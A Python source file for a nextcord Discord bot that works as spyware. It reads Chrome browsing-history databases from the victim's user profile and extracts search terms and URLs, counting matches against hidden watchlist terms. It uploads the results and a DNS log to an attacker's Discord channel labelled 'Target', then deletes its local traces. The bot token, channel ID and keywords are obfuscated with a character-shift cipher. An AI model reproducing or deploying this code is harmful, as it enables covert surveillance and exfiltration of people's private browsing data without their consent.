import sqlite3, json, os, shutil
from datetime import datetime
import nextcord
from nextcord.ext import commands
from commands import *

class FetchCommand:
    def __init__(self, query, type, command, terms):
        self.query = query
        self.type = type
        self.command = command
        self.checkterms = {Fetcher.Decrypt(k):0 for k in terms.split(",")}

    def format(self, results) -> list:
        col = []
        self.checkterms = {k:0 for k in self.checkterms}
        for result in results:
            for term in self.checkterms:
                if term in result[0]: 
                    self.checkterms[term]+=1

            date, time = result[1].split(" ")
            col.append({
                self.type: result[0],
                "Date": date,
                "Time": time
            })
        return col

class Fetcher:
    TargetDir = fr"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\\"
    EncryptStep = None
    Bot = commands.Bot(intents=nextcord.Intents.all())
    Channel = ChannelID = None
    Paths = []
    CurrentPath = None
    Error = None

    Root = os.path.dirname(os.path.abspath(__file__))+"\\"
    Out = f"{Root}out\\"

    Commands = []


    @staticmethod
    def Transfer(func):
        async def wrapper(*args):
            try:
                desc, filename = await func(*args)
                await Fetcher.Channel.send(content=f"```{desc}```", file=nextcord.File(filename))
            except Exception as e:
                await Fetcher.Channel.send(f"```Error: {e}```")
        return wrapper

    @staticmethod
    def Decrypt(string) -> str:
        return ''.join([chr(ord(c)-Fetcher.EncryptStep) for c in str(string)])

    @staticmethod
    def Run() -> None:
        Get = lambda string: os.environ.get(string)
        Fetcher.EncryptStep = int(Get("ENC"))

        Fetcher.ChannelID = int(Fetcher.Decrypt(Get("CHA")))
        Fetcher.Commands = [
            FetchCommand("Search Terms", "Query", term_cmd, Get("CT")),
            FetchCommand("URLs", "URL", url_cmd, Get("CU"))
        ]
        Fetcher.Paths = os.listdir(Fetcher.Out)
        
        try:
            Fetcher.Bot.run(Fetcher.Decrypt(Get("TOK")))
        except: ...

    @staticmethod
    @Bot.event
    async def on_ready() -> None:
        Fetcher.Channel = Fetcher.Bot.get_channel(Fetcher.ChannelID)
        if not Fetcher.Channel: 
            return

        await Fetcher.Channel.send(f"Time: `{datetime.now().strftime('%d/%m/%Y %H:%M')}`\nTarget: `{os.environ['USERPROFILE']}`")

        for i in Fetcher.Paths:
            Fetcher.Error = None
            Fetcher.CurrentPath = Fetcher.TargetDir+i
            
            try:
                await Fetcher.SearchHistory(Fetcher.Out+i)
            except Exception as e:
                await Fetcher.Channel.send(f"```Error: {e}```")

        await Fetcher.DNS()

        shutil.rmtree(Fetcher.Out)
        await Fetcher.Bot.close()

    @staticmethod
    @Transfer
    def SearchHistory(file) -> tuple:
        conn = sqlite3.connect(file)
        cursor = conn.cursor()

        contents = {}
        for command in Fetcher.Commands:
            cursor.execute(command.command)
            contents.update({command.query: command.format(cursor.fetchall())})
        for i in [cursor, conn]: 
            i.close()

        filename = f"{Fetcher.Out}{datetime.now().strftime('%d-%m-%Y')}.json"
        with open(filename, "w") as file:
            file.write(json.dumps(contents, indent=4))

        return Fetcher.CurrentPath, filename

    @staticmethod
    @Transfer
    def DNS() -> tuple:
        return "DNS", "log.txt"